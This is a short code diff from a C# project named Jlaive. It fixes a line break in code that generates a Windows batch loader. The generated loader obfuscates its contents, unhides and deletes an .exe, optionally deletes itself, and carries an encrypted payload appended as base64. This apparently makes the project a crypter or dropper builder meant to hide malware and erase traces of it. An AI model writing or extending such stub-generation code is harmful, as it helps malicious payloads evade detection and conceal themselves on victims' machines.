@@ -109,7 +109,7 @@ namespace Jlaive
             if (_obfuscate) output.Append(Obfuscator.GenCode(toobf.ToString(), rng, 1));
             else output.AppendLine(toobf.ToString());
             output.AppendLine("attrib -s -h \"%~dp0%~nx0.exe\"");
-            output.Append("del \"%~dp0%~nx0.exe\"");
+            output.AppendLine("del \"%~dp0%~nx0.exe\"");
             if (_deleteself) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
             output.AppendLine("exit /b");
             output.Append(Convert.ToBase64String(encrypted));
